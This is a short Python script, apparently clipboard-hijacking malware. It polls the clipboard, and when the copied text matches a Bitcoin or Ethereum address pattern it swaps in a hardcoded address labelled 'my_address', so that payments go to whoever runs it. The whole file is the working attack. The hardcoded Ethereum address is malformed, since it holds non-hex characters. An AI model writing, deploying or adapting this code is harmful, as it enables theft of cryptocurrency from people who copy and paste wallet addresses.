import pyperclip
import asyncio
import re

# For all possible BTC wallet configuration 
BTC_ADDRESS_MATCH = '([13]{1}[a-km-zA-HJ-NP-Z1-9]{27,34}|bc1[a-z0-9]{39,59})'
ETH_ADDRESS_MATCH = '0x[a-fA-F0-9]{40}'


# Matching and changing btc function.
async def btc_address(value):
    # matching btc address
    btc = re.match(BTC_ADDRESS_MATCH , value)
    eth = re.match(ETH_ADDRESS_MATCH, value)
    if btc != None :
        if value[0] == '1':
            my_address = '1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'
            new_value = pyperclip.copy(my_address)
            print(new_value)

        elif  value[0] == '3':
            my_address = '3BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2'
            new_value = pyperclip.copy(my_address)
            print(new_value)

        elif  value[0] == 'b':
            my_address = 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
            new_value = pyperclip.copy(my_address)
            print(new_value)

    elif eth != None:
        my_address = '0xc7d688cb053c19ad5ee4f48c3z48958880534j49r'
        new_value = pyperclip.copy(my_address)
        print(new_value)

    print (btc)
    print(eth)
        

async def wait4update(value):
    while True:
        if pyperclip.paste() != value : # If the clipboard changed.
            return

async def main():
    value = pyperclip.paste() # Set the default value.
    while True :
        update = asyncio.create_task(wait4update(value))
        await update
        value = pyperclip.paste() # Change the value.    
        asyncio.create_task(btc_address(value)) #Start your function.

asyncio.run(main())

